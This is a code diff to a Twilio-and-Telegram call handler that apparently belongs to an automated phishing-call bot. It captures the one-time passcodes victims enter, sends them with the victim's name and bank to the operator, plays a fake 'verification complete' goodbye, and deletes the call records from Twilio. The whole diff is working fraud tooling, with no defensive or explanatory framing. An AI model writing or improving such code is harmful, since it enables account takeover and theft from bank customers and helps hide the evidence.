@@ -207,16 +207,58 @@ class TwilioHandler:
         call_sid = callback_query.data.split("_")[2]
         
         try:
+            redis_client = self.create_redis_client()
+            if redis_client:
+                # Get the last OTP and call info before completing
+                last_otp = redis_client.get(f"last_otp:{call_sid}")
+                call_info = redis_client.hgetall(f'call_info:{call_sid}')
+
+            # Update call with goodbye message
             call = self.client.calls(call_sid).update(
                 twiml='<Response><Say voice="Polly.Joanna">Thank you for verifying your identity. Goodbye.</Say><Hangup/></Response>'
             )
-            self.bot.edit_message_text(
-                "✅ Verification accepted. Call completed.",
-                chat_id=chat_id,
-                message_id=message_id
+
+            # Wait for call to complete (with timeout)
+            max_wait_time = 30  # 30 seconds timeout
+            start_time = time.time()
+            while time.time() - start_time <= max_wait_time:
+                call = self.client.calls(call_sid).fetch()
+                if call.status == 'completed':
+                    # Now try to delete the call
+                    try:
+                        self.client.calls(call_sid).delete()
+                    except Exception as delete_error:
+                        logging.error(f"Error deleting call: {delete_error}")
+                    break
+                time.sleep(2)
+
+            final_text = (
+                f"📱 *Verification Complete*\n\n"
+                f"👤 Recipient: `{call_info.get('recipient_name', 'N/A')}`\n"
+                f"🏦 Bank: `{call_info.get('bank_name', 'N/A')}`\n"
+                f"🔑 Final Code: `{last_otp if last_otp else 'Not provided'}`\n"
+                f"✅ Status: *Completed*\n"
+                f"🕒 Time: {time.strftime('%H:%M:%S')}"
             )
+            
+            self.bot.edit_message_text(
+                final_text,
+                chat_id=chat_id,
+                message_id=message_id,
+                parse_mode="Markdown"
+            )
+
+            # Clean up Redis keys
+            if redis_client:
+                redis_client.delete(f"otp:{call_sid}")
+                redis_client.delete(f"last_otp:{call_sid}")
+                redis_client.delete(f"call_info:{call_sid}")
+
         except Exception as e:
             self.bot.send_message(chat_id, f"❌ Error accepting verification: {str(e)}")
+        finally:
+            if redis_client:
+                redis_client.close()
 
     def handle_verification_decline(self, call):
         chat_id = call.message.chat.id
@@ -226,6 +268,10 @@ class TwilioHandler:
         try:
             redis_client = self.create_redis_client()
             if redis_client:
+                # Store the latest OTP before clearing it
+                latest_otp = redis_client.get(f"otp:{call_sid}")
+                if latest_otp:
+                    redis_client.set(f"last_otp:{call_sid}", latest_otp)
                 redis_client.delete(f"otp:{call_sid}")
 
             call = self.client.calls(call_sid).update(
@@ -264,6 +310,8 @@ class TwilioHandler:
                                 parse_mode="Markdown",
                                 reply_markup=self.call_utils.create_verification_keyboard(call_sid)
                             )
+                            # Store this as the latest OTP
+                            redis_client.set(f"last_otp:{call_sid}", new_otp)
                             redis_client.delete(f"otp:{call_sid}")
                             otp_displayed = True
                             break
